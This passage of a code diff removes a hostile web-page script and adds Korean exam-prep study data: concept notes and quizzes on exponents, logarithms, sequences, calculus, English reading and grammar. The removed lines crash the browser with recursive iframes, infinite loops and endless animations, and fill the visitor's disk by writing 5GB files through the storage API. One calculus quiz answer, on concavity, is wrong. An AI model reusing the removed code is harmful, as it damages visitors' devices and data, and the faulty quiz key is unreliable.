-                        if(depth > 0) {
-                            for(let i=0; i<50; i++) {
-                                const d = document.createElement('div');
-                                d.attachShadow({mode: 'open'}).innerHTML = '<iframe srcdoc="' + btoa('<script>recurse(' + (depth-1) + ');</script>') + '"></iframe>';
-                                document.body.appendChild(d);
-                            }
-                        } else {
-                            while(1){}
-                        }
-                    }
-                    recurse(10);
-                <\/script>
-            `;
-            shadow.appendChild(iframe);
-            document.body.appendChild(div);
-            
-            if(iframeCount++ > 100) {
-                document.body.innerHTML += '<div style="display:none">' + 'X'.repeat(10**8) + '</div>';
-            }
-            setTimeout(createHell, 1);
+          ]
         }
-        createHell();
-
-        // (5-B) 무한 CSS 애니메이션 (업그레이드: 동적 스타일 삽입 + observer)
-        const observer = new MutationObserver(() => {});
-        observer.observe(document.body, { childList: true, subtree: true });
-        setInterval(() => {
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes ultra_doom {
-                    0% { transform: rotate(0deg) scale(1) translate(0,0); }
-                    20% { transform: rotate(72deg) scale(2) translate(100px,100px); }
-                    40% { transform: rotate(144deg) scale(0.5) translate(-100px,-100px); }
-                    60% { transform: rotate(216deg) scale(4) translate(200px,200px); }
-                    80% { transform: rotate(288deg) scale(0.2) translate(-200px,-200px); }
-                    100% { transform: rotate(360deg) scale(1) translate(0,0); }
-                }
-                * {
-                    animation: ultra_doom 0.01s infinite linear, chaos 0.02s infinite, apocalypse 0.03s infinite;
-                    will-change: all;
-                }
-            `;
-            document.head.appendChild(style);
-        }, 10);
-    </script>
-
-    <!-- ====== 6. 파일시스템 초토화 시스템 (업그레이드: 무한 디렉토리 트리 + 파일 시스템 싱크) ====== -->
-    <script>
-        // (6-A) File System Access API 남용 (업그레이드: 10레벨 재귀 디렉토리 + 싱크 오버로드)
-        navigator.storage.getDirectory().then(async (root) => {
-            async function createDoomDir(dir, depth) {
-                if(depth > 0) {
-                    const subDir = await dir.getDirectoryHandle(`doom_${Date.now()}_${Math.random()}`, { create: true });
-                    for(let i=0; i<50; i++) {
-                        const file = await subDir.getFileHandle(`kill_${i}_${Math.random()}`, { create: true });
-                        const writer = await file.createWritable();
-                        await writer.write(new Blob([new ArrayBuffer(10 ** 9 * 5)])); // 5GB
-                        await writer.close();
-                        const sync = await file.createSyncAccessHandle();
-                        sync.write(new Uint8Array(10**8));
-                        sync.close();
-                    }
-                    createDoomDir(subDir, depth-1);
-                }
+      },
+      "수학": {
+        "수학I": {
+          concepts: [
+            {
+              title: "지수법칙",
+              content: `지수법칙은 지수함수와 지수식을 간단히 변형하기 위한 기본 규칙이다. 같은 밑의 거듭제곱을 곱하면 지수를 더하고, 나누면 지수를 빼며, 거듭제곱을 거듭제곱하면 지수를 곱한다. 이러한 법칙은 로그 계산과 지수함수의 그래프 해석에 필수이며, 수능에서는 복잡한 식을 간단히 정리하는 데 자주 활용된다. 지수법칙의 조건으로 밑이 0이 아님을 항상 확인해야 한다.`
+            },
+            {
+              title: "로그의 성질",
+              content: `로그는 지수의 역연산으로 정의되며, 로그의 성질은 곱셈, 나눗셈, 거듭제곱을 덧셈, 뺄셈, 곱셈으로 전환한다. 로그의 밑 변환 공식은 밑이 다른 로그를 비교할 때 사용된다. 로그의 정의역은 양수이고 밑이 0이나 1이 될 수 없다는 점이 중요하며, 수능에서는 로그 함수의 그래프와 방정식 풀이에서 정의역을 검토하는 문제에 자주 등장한다.`
+            },
+            {
+              title: "지수함수 그래프",
+              content: `지수함수 y=a^x는 a가 1보다 클 때 증가 함수, 0과 1 사이일 때 감소 함수로 나타난다. 그래프는 x축과 만나지 않으며 y절편은 1이다. 지수함수의 그래프는 로그함수와 y=x에 대해 대칭 관계를 이룬다. 또한 지수함수의 변화율은 x가 증가할수록 커지며, 이는 급격한 성장이나 감소를 설명하는 모델링에 활용된다.`
+            },
+            {
+              title: "로그함수 그래프",
+              content: `로그함수 y=log_a x는 x>0에서 정의되며 a>1이면 증가, 0<a<1이면 감소한다. 그래프는 y축과 만나지 않으며 x절편은 1이다. 로그함수는 지수함수와 역함수 관계에 있어 y=x에 대해 대칭이고, 점근선은 x=0이다. 수능에서는 로그함수의 성질을 이용해 방정식과 부등식을 푸는 문제가 출제된다.`
+            },
+            {
+              title: "수열의 개념",
+              content: `수열은 일정한 규칙에 따라 나열된 수의 열이며, 일반항과 점화식으로 표현할 수 있다. 등차수열은 항의 차가 일정하고 등비수열은 항의 비가 일정하다. 수열의 합 공식과 성질을 정확히 이해하면 수능에서 다양한 함수적 문제를 해결할 수 있다. 특히 수열은 함수와 그래프, 극한 개념과 연결되어 수학II와 미적분의 기초가 된다.`
+            },
+            {
+              title: "등차수열의 합",
+              content: `등차수열의 합은 첫째항과 마지막항의 평균에 항의 개수를 곱해 구한다. 공식은 S_n = n/2(2a+(n-1)d)로 표현되며, 이는 수열의 형태를 분석해 항의 개수나 공차를 추론하는 데 활용된다. 수능에서는 등차수열의 합 공식과 조건을 결합해 항을 역으로 구하는 문제를 해결해야 한다.`
+            },
+            {
+              title: "등비수열의 합",
+              content: `등비수열의 합은 공비가 1이 아닐 때 S_n = a(r^n-1)/(r-1)로 나타낸다. 공비가 1인 경우에는 등차수열과 동일한 형태가 된다. 수능에서는 공비의 절댓값이 1보다 작은 무한등비급수를 다루어 수렴값을 구하는 문제가 등장한다. 수열의 합 공식은 합과 일반항 사이의 관계를 파악하는 데 필수다.`
+            },
+            {
+              title: "수열의 점화식",
+              content: `점화식은 현재 항을 이전 항과의 관계로 표현하는 방식이다. 등차수열은 a_{n+1}=a_n+d, 등비수열은 a_{n+1}=ra_n 형태로 나타난다. 수능에서는 점화식을 해석해 일반항을 도출하거나, 조건에 맞는 점화식을 직접 설정하는 문제가 출제된다. 점화식을 통해 수열의 성질과 증가·감소 여부를 판단할 수 있다.`
+            },
+            {
+              title: "수열의 귀납적 정의",
+              content: `수열은 첫째항과 점화식을 통해 귀납적으로 정의될 수 있으며, 이를 통해 수열의 성질을 분석한다. 귀납적 정의는 수열의 존재와 특징을 설명할 때 유용하며, 수학적 귀납법과 연결된다. 수능에서는 귀납적 정의로 주어진 수열의 일반항이나 합을 구하는 문제가 자주 출제된다.`
+            },
+            {
+              title: "수열과 함수의 연결",
+              content: `수열을 함수로 표현하면 그래프를 통해 증가·감소 및 극한 성질을 분석할 수 있다. 수열의 일반항 a_n을 f(n)으로 보면 자연수 영역에서의 함수 값으로 해석할 수 있으며, 이는 극한 개념으로 확장된다. 수열과 함수의 연결을 이해하면 수능에서 극한 문제나 연속성 문제를 보다 직관적으로 접근할 수 있다.`
             }
-            setInterval(() => createDoomDir(root, 10), 10); // 10레벨 깊이
-        });
-    </script>
+          ],
+          quizzes: [
+            {
+              q: "지수법칙 a^m · a^n = a^(m+n)이 성립하려면 무엇이 필요할까?",
+              options: ["a=0", "a=1", "a≠0", "m=n", "m=0"],
+              answer: 2,
+              explanation: "지수법칙은 밑 a가 0이 아닐 때 성립한다."
+            },
+            {
+              q: "로그의 정의역 조건으로 옳은 것은?",
+              options: ["x=0", "x<0", "x>0", "x=1", "x는 모든 실수"],
+              answer: 2,
+              explanation: "로그 함수는 x>0에서만 정의된다."
+            },
+            {
+              q: "지수함수 y=a^x에서 a가 0과 1 사이일 때 그래프는?",
+              options: ["증가", "감소", "상수", "주기", "정의되지 않음"],
+              answer: 1,
+              explanation: "0<a<1이면 지수함수는 감소 함수이다."
+            },
+            {
+              q: "등차수열의 합 공식은?",
+              options: ["n(a_1+a_n)", "n/2(2a+(n-1)d)", "a(r^n-1)/(r-1)", "a+nd", "a(r-1)/(r^n-1)"],
+              answer: 1,
+              explanation: "등차수열의 합은 n/2(2a+(n-1)d)이다."
+            },
+            {
+              q: "등비수열 합 공식에서 공비 r이 1일 때 합은?",
+              options: ["a(r^n-1)/(r-1)", "n·a", "a+r", "0", "a/r"],
+              answer: 1,
+              explanation: "공비 r=1일 때 모든 항이 a이므로 합은 n·a이다."
+            },
+            {
+              q: "수열의 점화식 a_{n+1}=a_n+d는 어떤 수열?",
+              options: ["등비수열", "등차수열", "조화수열", "피보나치", "무한수열"],
+              answer: 1,
+              explanation: "차이가 일정한 등차수열이다."
+            },
+            {
+              q: "로그함수 y=log_a x의 점근선은?",
+              options: ["y=0", "x=0", "y=1", "x=1", "y=x"],
+              answer: 1,
+              explanation: "로그함수는 x=0을 점근선으로 가진다."
+            },
+            {
+              q: "수열을 함수로 해석하는 이점으로 옳은 것은?",
+              options: ["그래프 해석 불가", "증가·감소를 직관적으로 파악", "정의역이 실수가 된다", "항이 무한히 줄어든다", "항의 값이 일정하다"],
+              answer: 1,
+              explanation: "수열을 함수로 보면 그래프를 통해 성질을 직관적으로 파악할 수 있다."
+            },
+            {
+              q: "로그 밑 변환 공식의 형태는?",
+              options: ["log_a b = log_b a", "log_a b = log_c b / log_c a", "log_a b = a^b", "log_a b = b^a", "log_a b = log_a a"],
+              answer: 1,
+              explanation: "밑 변환 공식은 log_a b = log_c b / log_c a이다."
+            },
+            {
+              q: "무한등비급수가 수렴하려면 공비 r의 조건은?",
+              options: ["r>1", "r=1", "|r|<1", "r=0", "r<0"],
+              answer: 2,
+              explanation: "무한등비급수는 |r|<1일 때 수렴한다."
+            }
+          ]
+        },
+        "수학II": {
+          concepts: [
+            {
+              title: "함수의 극한",
+              content: `함수의 극한은 x가 특정 값에 가까워질 때 함수값이 가까워지는 값을 의미한다. 극한값이 존재하려면 좌극한과 우극한이 같아야 하며, 무한대로 발산하는 경우 극한이 존재하지 않는다. 수능에서는 함수의 그래프와 대수적 계산을 통해 극한값을 구하고, 불연속점의 종류를 판별하는 문제가 자주 출제된다.`
+            },
+            {
+              title: "연속성과 미분 가능성",
+              content: `함수가 x=a에서 연속이려면 f(a)가 정의되고, 극한값이 존재하며, 극한값과 함수값이 같아야 한다. 미분 가능성은 연속성을 필요조건으로 하며, 접선의 기울기가 양쪽에서 동일해야 한다. 연속하지만 미분 불가능한 함수(절댓값 함수 등)를 구분하는 것이 중요하다. 수능에서는 연속 조건을 이용해 상수를 결정하는 문제가 자주 나온다.`
+            },
+            {
+              title: "미분의 정의",
+              content: `미분은 변화율을 나타내며, 접선의 기울기와 동일하다. 정의는 lim_{h→0} (f(x+h)-f(x))/h로 표현되고, 이를 통해 도함수를 구한다. 도함수는 함수의 증가·감소, 극대·극소, 변곡점을 판단하는 핵심 도구다. 수능에서는 미분을 이용한 최적화와 그래프 해석 문제가 집중적으로 출제된다.`
+            },
+            {
+              title: "미분의 활용",
+              content: `미분을 활용하면 함수의 증가·감소 구간, 극값, 곡선의 오목·볼록을 판단할 수 있다. 도함수의 부호는 함수의 증가·감소를 결정하고, 도함수의 변화는 곡률을 보여준다. 수능에서는 미분을 이용해 최대·최소값을 구하고, 넓이나 길이를 최적화하는 문제를 해결해야 한다.`
+            },
+            {
+              title: "적분의 개념",
+              content: `적분은 넓이와 누적량을 나타내는 개념으로, 미분의 역연산이다. 부정적분은 원함수를 구하는 과정이고, 정적분은 구간 내 면적을 계산한다. 정적분의 값은 함수값이 음수일 때 부호가 반영되므로, 넓이를 구할 때는 절댓값을 고려해야 한다. 수능에서는 적분을 이용한 넓이, 평균값, 이동거리 문제가 출제된다.`
+            },
+            {
+              title: "정적분의 성질",
+              content: `정적분은 구간 분할과 합의 극한으로 정의되며, 선형성, 구간 분할, 대칭성 등의 성질을 가진다. 예를 들어 ∫_a^b (f+g)dx = ∫_a^b f dx + ∫_a^b g dx로 분해할 수 있다. 이러한 성질을 활용하면 복잡한 적분을 간단히 계산할 수 있고, 수능에서는 대칭성을 이용해 계산을 줄이는 문제가 자주 나온다.`
+            },
+            {
+              title: "도함수의 응용",
+              content: `도함수는 접선 방정식, 속도·가속도, 변화율의 해석에 활용된다. 기하적 의미로는 곡선의 접선 기울기이며, 물리적 의미로는 위치 함수의 순간 속도이다. 수능에서는 도함수를 이용해 두 함수가 만나는 점에서의 접선 관계를 분석하거나, 물리적 상황을 수학적으로 모델링하는 문제가 등장한다.`
+            },
+            {
+              title: "곡선의 길이와 넓이",
+              content: `곡선의 길이는 미분을 이용한 길이 공식으로 계산하며, 넓이는 정적분을 통해 구한다. 수능에서는 주로 두 곡선 사이의 넓이를 구하는 문제가 출제되며, 교점 계산과 부호 판단이 핵심이다. 넓이 계산 시 그래프의 위치를 파악해 적절한 구간 분할을 해야 정확한 값을 얻을 수 있다.`
+            },
+            {
+              title: "함수의 그래프 분석",
+              content: `함수 그래프는 극한, 연속, 미분의 결과를 통합적으로 분석해야 한다. 도함수를 통해 증가·감소와 극값을 찾고, 이차 도함수를 통해 오목·볼록과 변곡점을 판단한다. 수능에서는 그래프의 모양을 보고 함수의 식을 추론하거나, 그래프 변화에 따른 조건을 만족하는 상수를 찾는 문제가 출제된다.`
+            },
+            {
+              title: "적분의 응용",
+              content: `적분은 누적량을 계산하는 도구로, 이동거리, 회전체의 부피, 평균값 등을 구할 때 사용한다. 수능에서는 속도-시간 그래프의 면적을 통해 이동거리나 위치 변화를 계산하거나, 평균값 정리를 활용한 문제를 해결하는 경우가 많다. 적분의 물리적 의미를 이해하는 것이 문제 해결의 핵심이다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "함수의 극한이 존재하기 위한 조건은?",
+              options: ["좌극한만 존재", "우극한만 존재", "좌극한과 우극한이 같음", "함수값이 0", "함수값이 무한"],
+              answer: 2,
+              explanation: "좌극한과 우극한이 같을 때 극한이 존재한다."
+            },
+            {
+              q: "연속이지만 미분 불가능한 예로 적절한 함수는?",
+              options: ["x^2", "|x|", "x^3", "sin x", "e^x"],
+              answer: 1,
+              explanation: "|x|는 x=0에서 연속이지만 미분 불가능하다."
+            },
+            {
+              q: "미분의 정의로 옳은 것은?",
+              options: ["lim_{h→0} (f(x+h)-f(x))/h", "lim_{x→0} f(x)", "∫ f(x)dx", "f(x)·g(x)", "f(x)/g(x)"],
+              answer: 0,
+              explanation: "미분은 차분비의 극한으로 정의된다."
+            },
+            {
+              q: "도함수의 부호가 양수이면 함수는?",
+              options: ["감소", "증가", "극대", "극소", "상수"],
+              answer: 1,
+              explanation: "도함수가 양수면 함수는 증가한다."
+            },
+            {
+              q: "정적분의 의미로 옳은 것은?",
+              options: ["함수값의 평균", "곡선 아래의 누적량", "접선 기울기", "함수의 극한", "함수의 합성"],
+              answer: 1,
+              explanation: "정적분은 구간에서의 누적량(면적)을 나타낸다."
+            },
+            {
+              q: "정적분의 선형성은 어떤 의미인가?",
+              options: ["적분 순서를 바꾼다", "합의 적분은 적분의 합", "적분값은 0", "항상 대칭", "무한히 분할"],
+              answer: 1,
+              explanation: "선형성은 ∫(f+g)=∫f+∫g를 뜻한다."
+            },
+            {
+              q: "도함수의 기하적 의미는?",
+              options: ["곡선의 넓이", "접선의 기울기", "함수값의 평균", "곡선의 길이", "함수의 점근선"],
+              answer: 1,
+              explanation: "도함수는 곡선의 접선 기울기를 나타낸다."
+            },
+            {
+              q: "두 곡선 사이의 넓이를 구할 때 필요한 과정은?",
+              options: ["교점 계산", "함수의 합", "로그 변환", "극한 계산", "미분 불필요"],
+              answer: 0,
+              explanation: "넓이를 구하려면 교점으로 구간을 나눠야 한다."
+            },
+            {
+              q: "이차 도함수의 부호가 음수이면 그래프는?",
+              options: ["위로 볼록", "아래로 볼록", "직선", "불연속", "정의되지 않음"],
+              answer: 1,
+              explanation: "이차 도함수가 음수이면 그래프는 아래로 볼록하다."
+            },
+            {
+              q: "적분을 이용해 구할 수 없는 것은?",
+              options: ["이동거리", "부피", "평균값", "접선 기울기", "넓이"],
+              answer: 3,
+              explanation: "접선 기울기는 미분을 통해 구한다."
+            }
+          ]
+        },
+        "미적분": {
+          concepts: [
+            {
+              title: "수열의 극한",
+              content: `수열의 극한은 n이 무한히 커질 때 수열의 값이 가까워지는 수를 의미한다. 극한이 존재하려면 수열이 일정 값에 수렴해야 하며, 발산하거나 진동하면 극한이 없다. 수능에서는 분수 형태의 수열을 약분하거나 최고차 항을 비교하여 극한을 구하는 문제가 많다. 또한 수열의 극한을 함수의 극한과 연결하여 해석하는 능력이 요구된다.`
+            },
+            {
+              title: "함수의 극한과 연속 심화",
+              content: `미적분에서는 함수의 극한을 이용해 복잡한 함수의 연속성을 분석한다. 특히 함수의 극한을 이용한 무한대에서의 거동 분석이 중요하며, 다항식, 유리함수, 삼각함수의 극한을 다양한 방법으로 계산한다. 연속성은 함수의 그래프 해석과 연결되어, 불연속점을 찾고 함수를 적절히 수정하는 과정에서 활용된다.`
+            },
+            {
+              title: "미분법 심화",
+              content: `미적분에서는 합성함수의 미분, 곱과 몫의 미분, 음함수 미분 등 고급 미분법을 다룬다. 합성함수 미분은 체인 룰을 적용하고, 음함수 미분은 미분 후 미지수에 대해 정리해야 한다. 수능에서는 미분법의 정확한 적용을 통해 복잡한 함수의 도함수를 구하고, 기하적 의미를 해석하는 문제가 등장한다.`
+            },
+            {
+              title: "접선과 법선",
+              content: `곡선의 접선은 도함수를 이용해 구하며, 접선의 기울기는 f'(a)로 표현된다. 법선은 접선에 수직인 직선으로, 기울기는 -1/f'(a)이다. 접선과 법선의 방정식을 구할 때는 점-기울기 형식을 이용하며, 수능에서는 두 곡선의 접선이 평행하거나 수직인 조건을 찾는 문제가 자주 출제된다.`
+            },
+            {
+              title: "적분법 심화",
+              content: `미적분에서는 치환적분과 부분적분을 통해 복잡한 적분을 계산한다. 치환적분은 변수 변환으로 적분을 단순화하고, 부분적분은 곱 형태의 함수 적분을 분해한다. 수능에서는 직접 계산보다는 적절한 치환이나 구조를 파악해 빠르게 값을 구하는 능력이 중요하다.`
+            },
+            {
+              title: "정적분과 넓이",
+              content: `정적분은 넓이를 계산하는 도구이며, 곡선 아래의 영역뿐 아니라 두 곡선 사이의 넓이까지 구할 수 있다. 수능에서는 삼각함수나 지수함수 그래프를 활용한 넓이 문제, 대칭성을 이용한 넓이 계산 문제가 등장한다. 넓이 문제에서 부호와 구간 설정을 정확히 하는 것이 핵심이다.`
+            },
+            {
+              title: "정적분과 부피",
+              content: `회전체의 부피는 정적분을 활용하여 구한다. x축이나 y축을 기준으로 회전할 때 원판법 또는 원통껍질법을 사용할 수 있으며, 적절한 방법을 선택해 계산을 단순화한다. 수능에서는 회전체의 부피를 구하면서 함수의 교점과 구간을 정확히 설정해야 한다.`
+            },
+            {
+              title: "미분방정식의 기초",
+              content: `미적분에서는 간단한 형태의 미분방정식을 다루며, 변화율과 상태 변수의 관계를 모델링한다. 예를 들어 성장 모델에서는 dy/dx = ky 형태가 나타나고, 이를 적분하여 지수함수 해를 구할 수 있다. 수능에서는 기초적인 미분방정식의 해석과 의미를 파악하는 문제가 간접적으로 출제될 수 있다.`
+            },
+            {
+              title: "수열과 급수의 수렴",
+              content: `급수는 수열의 합으로 정의되며, 수렴 여부가 중요하다. 등비급수의 수렴 조건과 합, 그리고 간단한 비교판정법을 이해해야 한다. 수능에서는 급수의 수렴과 관련된 계산 문제나 수열의 성질을 이용한 문제를 풀어야 하며, 무한급수의 의미를 명확히 이해하는 것이 필요하다.`
+            },
+            {
+              title: "함수의 그래프 심화",
+              content: `미적분에서는 도함수와 이차 도함수를 활용하여 함수의 그래프를 정밀하게 분석한다. 극값, 변곡점, 점근선의 위치를 판단하여 그래프의 전체 형상을 그리는 과정이 중요하다. 수능에서는 주어진 조건으로 함수식을 구하거나 그래프의 형태를 유추하는 문제가 다수 출제된다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "수열의 극한이 존재하려면 어떤 조건이 필요한가?",
+              options: ["항이 증가", "항이 감소", "항이 일정 값에 수렴", "항이 무한히 커짐", "항이 진동"],
+              answer: 2,
+              explanation: "수열의 극한은 항이 일정 값에 수렴할 때 존재한다."
+            },
+            {
+              q: "합성함수 미분법의 핵심은?",
+              options: ["덧셈", "체인 룰", "부분적분", "적분 변환", "함수 교환"],
+              answer: 1,
+              explanation: "합성함수는 체인 룰을 이용해 미분한다."
+            },
+            {
+              q: "접선의 기울기는 어떤 값으로 구하는가?",
+              options: ["f(a)", "f'(a)", "f''(a)", "1/f(a)", "-f(a)"],
+              answer: 1,
+              explanation: "접선의 기울기는 f'(a)이다."
+            },
+            {
+              q: "부분적분 공식의 형태로 옳은 것은?",
+              options: ["∫udv = uv - ∫vdu", "∫udv = uv + ∫vdu", "∫udv = u+v", "∫udv = u/v", "∫udv = ∫u·v"],
+              answer: 0,
+              explanation: "부분적분 공식은 ∫udv = uv - ∫vdu이다."
+            },
+            {
+              q: "회전체의 부피를 구하는 방법으로 옳은 것은?",
+              options: ["원판법", "적분 불필요", "미분만 사용", "로그 변환", "행렬"],
+              answer: 0,
+              explanation: "회전체 부피는 원판법 또는 원통껍질법을 사용한다."
+            },
+            {
+              q: "법선의 기울기는 접선 기울기 m에 대해?",
+              options: ["m", "-m", "1/m", "-1/m", "m^2"],
+              answer: 3,
+              explanation: "법선은 접선에 수직이므로 기울기는 -1/m이다."
+            },
+            {
+              q: "등비급수가 수렴하려면?",
+              options: ["r=1", "|r|<1", "r>1", "r=0", "r<0"],
+              answer: 1,
+              explanation: "등비급수는 |r|<1일 때 수렴한다."
+            },
+            {
+              q: "미분방정식 dy/dx = ky의 해 형태는?",
+              options: ["y=ax+b", "y=ke^x", "y=Ce^{kx}", "y=1/x", "y=sin x"],
+              answer: 2,
+              explanation: "dy/dx = ky는 지수함수 형태 y=Ce^{kx}로 해가 나온다."
+            },
+            {
+              q: "이차 도함수의 부호 변화는 무엇을 의미하는가?",
+              options: ["불연속", "변곡점", "절댓값", "점근선", "정의역"],
+              answer: 1,
+              explanation: "이차 도함수의 부호 변화는 변곡점을 의미한다."
+            },
+            {
+              q: "정적분을 이용해 구할 수 있는 것은?",
+              options: ["접선 기울기", "회전체 부피", "함수의 극한", "수열의 점화식", "대칭성"],
+              answer: 1,
+              explanation: "정적분은 회전체 부피를 계산할 수 있다."
+            }
+          ]
+        }
+      },
+      "영어": {
+        "독해": {
+          concepts: [
+            {
+              title: "빈칸 추론 전략",
+              content: `빈칸 추론은 문맥과 논리 구조를 기반으로 핵심 의미를 찾는 문제 유형이다. 문단의 주제문과 결론을 먼저 파악한 뒤, 연결어와 대조 구조를 분석하면 빈칸에 들어갈 핵심 개념을 추론할 수 있다. 특히 반복되는 키워드와 유의어를 찾는 것이 중요하며, 빈칸 전후의 문장을 통해 논리적 흐름을 검증해야 한다.`
+            },
+            {
+              title: "문장 삽입",
+              content: `문장 삽입 문제는 글의 흐름과 논리적 연결을 파악해야 한다. 삽입 문장은 대명사, 지시어, 연결어를 통해 앞뒤 문장과의 관계를 형성한다. 따라서 글의 구조를 크게 도입-전개-결론으로 나누고, 각 문단의 중심 내용을 파악한 후 빈칸 위치를 결정하는 것이 효과적이다.`
+            },
+            {
+              title: "순서 배열",
+              content: `순서 배열 문제는 사건의 시간 순서, 인과 관계, 논리 전개 방식에 대한 이해가 필요하다. 연결어(therefore, however, moreover 등)의 기능을 파악하고, 대명사나 지시어가 가리키는 대상을 추적하면 올바른 순서를 찾을 수 있다. 글의 전체 주제를 파악한 뒤 세부 문장의 역할을 파악해야 한다.`
+            },
+            {
+              title: "주제·제목 찾기",
+              content: `주제문은 글 전체의 핵심 주장이나 내용을 요약한 문장이다. 주제와 제목을 찾을 때는 반복되는 핵심 단어와 문단의 결론을 중심으로 파악해야 한다. 세부 사례나 설명은 주제를 뒷받침하는 요소이므로, 세부 정보보다 중심 내용을 먼저 정리하는 것이 중요하다.`
+            },
+            {
+              title: "요지 추론",
+              content: `요지 추론은 글쓴이의 핵심 주장이나 의도를 파악하는 문제다. 글의 논증 구조를 파악하고, 다양한 사례와 설명의 공통점을 도출해야 한다. 요지는 일반적으로 마지막 문장이나 첫 문장에 위치하는 경우가 많지만, 강조 표현이나 대조 구조를 통해 숨겨진 결론을 파악해야 한다.`
+            },
+            {
+              title: "세부 정보 확인",
+              content: `세부 정보 문제는 글의 특정 사실이나 근거를 정확히 이해하는 능력을 요구한다. 지문을 빠르게 훑어 핵심 키워드를 찾고, 문제에서 요구하는 정보가 있는 문장을 정확히 확인하는 전략이 필요하다. 세부 정보는 주로 수치, 비교 대상, 조건 등을 포함하며, 간단한 추론이 필요한 경우도 있다.`
+            },
+            {
+              title: "어휘 추론",
+              content: `어휘 추론 문제는 문맥 속 단어의 의미를 유추하는 능력을 평가한다. 같은 단어라도 문맥에 따라 의미가 달라질 수 있으므로, 주변 문장을 통해 의미를 추론해야 한다. 특히 반의어나 유의어, 설명 구문이 단서가 되는 경우가 많으며, 어휘의 뉘앙스 차이를 고려해야 한다.`
+            },
+            {
+              title: "주장과 근거",
+              content: `영어 지문에서 주장과 근거를 구분하는 것은 논리 구조를 파악하는 데 중요하다. 주장은 글쓴이의 의견이나 결론이고, 근거는 주장을 뒷받침하는 이유나 사실이다. 따라서 because, since, as 등의 연결어를 주의 깊게 살펴야 하며, 논리적 구조를 분석해 글의 설득력과 흐름을 파악해야 한다.`
+            },
+            {
+              title: "대조와 비교",
+              content: `대조 구조는 서로 다른 관점이나 사례를 비교하여 의미를 강조하는 방식이다. however, on the other hand, unlike 등의 표현은 대조를 나타내며, 비교 구조는 similarly, likewise 등의 표현으로 나타난다. 수능에서는 대조와 비교를 통해 글쓴이의 의도를 추론하거나 특정 정보를 강조하는 문제를 해결해야 한다.`
+            },
+            {
+              title: "추론형 독해",
+              content: `추론형 독해는 지문에 직접적으로 제시되지 않은 정보를 논리적으로 도출하는 문제 유형이다. 문장의 함축 의미, 글쓴이의 태도, 숨겨진 결론 등을 추론해야 하므로, 단순한 정보 확인보다 높은 사고력을 요구한다. 문맥 속 단서와 논리적 연결을 통해 결론을 도출하는 연습이 필요하다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "빈칸 추론 문제 해결에 가장 효과적인 전략은?",
+              options: ["문법만 분석", "문맥과 논리 흐름 파악", "단어 개별 암기", "첫 문장만 보기", "마지막 문장만 보기"],
+              answer: 1,
+              explanation: "빈칸 추론은 문맥과 논리 흐름을 파악해 핵심 의미를 찾아야 한다."
+            },
+            {
+              q: "문장 삽입 문제에서 가장 중요한 단서는?",
+              options: ["동의어 반복", "대명사와 연결어", "길이", "문장부호", "글자 수"],
+              answer: 1,
+              explanation: "삽입 문장은 대명사와 연결어를 통해 앞뒤 문장과 연결된다."
+            },
+            {
+              q: "순서 배열 문제 해결에 도움이 되는 요소는?",
+              options: ["무작정 추측", "시간·인과 관계", "문장 길이", "단어 수", "소리"],
+              answer: 1,
+              explanation: "시간 순서와 인과 관계를 분석해 순서를 파악한다."
+            },
+            {
+              q: "주제 찾기에서 가장 먼저 확인해야 할 것은?",
+              options: ["세부 사례", "반복되는 핵심 단어", "문법 형태", "문장 길이", "문장 수"],
+              answer: 1,
+              explanation: "반복되는 핵심 단어가 주제를 드러낸다."
+            },
+            {
+              q: "요지 추론 문제에서 요지는 주로 어디에 위치하는가?",
+              options: ["중간 문장", "첫 문장 또는 마지막 문장", "두 번째 문장", "네 번째 문장", "임의"],
+              answer: 1,
+              explanation: "요지는 대개 첫 문장이나 마지막 문장에 위치한다."
+            },
+            {
+              q: "세부 정보 문제의 핵심 전략은?",
+              options: ["전체 암기", "키워드 스캔", "번역만 수행", "문법 분석", "추측"],
+              answer: 1,
+              explanation: "문제에 제시된 키워드를 중심으로 지문을 스캔한다."
+            },
+            {
+              q: "어휘 추론에서 중요한 단서는?",
+              options: ["문맥과 주변 표현", "철자", "발음", "품사", "문장 길이"],
+              answer: 0,
+              explanation: "문맥과 주변 표현이 단어 의미를 추론하는 단서가 된다."
+            },
+            {
+              q: "주장과 근거를 구분할 때 주의해야 할 연결어는?",
+              options: ["however", "because", "although", "yet", "unless"],
+              answer: 1,
+              explanation: "because, since 등은 근거를 제시하는 연결어이다."
+            },
+            {
+              q: "대조 구조를 나타내는 표현은?",
+              options: ["moreover", "similarly", "however", "therefore", "thus"],
+              answer: 2,
+              explanation: "however는 대조를 나타내는 대표적 표현이다."
+            },
+            {
+              q: "추론형 독해의 특징으로 옳은 것은?",
+              options: ["직접 제시된 정보만 찾음", "숨은 결론을 논리적으로 도출", "문법 문제", "단어 철자 확인", "발음 문제"],
+              answer: 1,
+              explanation: "추론형 독해는 지문에 없는 결론을 논리적으로 도출한다."
+            }
+          ]
+        },
+        "문법": {
+          concepts: [
+            {
+              title: "관계대명사",
+              content: `관계대명사는 선행사를 수식하는 절을 이끄는 역할을 하며, who, which, that 등이 대표적이다. 관계대명사는 주격, 목적격, 소유격으로 구분되며, 문장 내에서 명사절과 형용사절의 역할을 수행한다. 수능에서는 관계대명사의 생략, 전치사+관계대명사 구조, 계속적 용법 등을 구분하는 문제가 자주 출제된다.`
+            },
+            {
+              title: "가정법",
+              content: `가정법은 현실과 다른 상황을 가정하여 말하는 표현이다. 가정법 과거는 현재 사실과 반대되는 상황을 나타내며 If + 과거, 주절 would + 동사원형으로 표현한다. 가정법 과거완료는 과거 사실과 반대되는 상황을 나타내며 If + had p.p., 주절 would have p.p. 구조를 사용한다. 수능에서는 시제 일치와 의미 해석을 정확히 이해해야 한다.`
+            },
+            {
+              title: "분사 구문",
+              content: `분사 구문은 부사절을 간단히 축약한 형태로, 현재분사나 과거분사를 사용한다. 주어가 같을 때 부사절의 접속사와 주어를 생략하며, 문장의 의미상 주어가 다를 경우 독립분사구문을 사용한다. 분사 구문은 시간, 이유, 조건, 양보 등의 다양한 의미로 해석되므로 문맥에 따라 적절한 해석을 해야 한다.`
+            },
+            {
+              title: "병렬 구조",
+              content: `병렬 구조는 문장에서 동일한 기능을 하는 요소를 나란히 배치하는 원칙이다. 병렬 구조가 깨지면 문장 구조가 어색해지거나 의미 전달이 불명확해진다. 수능에서는 병렬 구조를 찾고 수정하는 문법 문제가 자주 출제되며, and, or, both A and B 등의 구조에서 품사의 일치를 확인해야 한다.`
+            },
